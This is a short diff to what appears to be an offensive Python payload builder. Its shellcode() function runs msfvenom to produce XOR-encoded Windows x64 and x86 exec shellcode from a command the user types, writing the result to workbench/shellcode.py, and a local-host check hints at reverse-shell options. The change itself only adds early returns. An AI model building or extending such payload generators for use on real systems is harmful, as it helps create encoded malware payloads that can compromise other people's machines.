@@ -44,12 +44,14 @@ def shellcode():
         print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
         subprocess.call(f'msfvenom -p windows/x64/exec CMD=\'{cmd}\' -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')
+        return
 
     if arguments.payload == 'windows/exec':
         cmd = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Put the command: ')
         print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
         subprocess.call(f'msfvenom -p windows/exec CMD=\'{cmd}\' -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')
+        return
         
     if not arguments.lhost:
         print(f'{Fore.LIGHTRED_EX}[+]{Fore.LIGHTWHITE_EX} Local host missing')
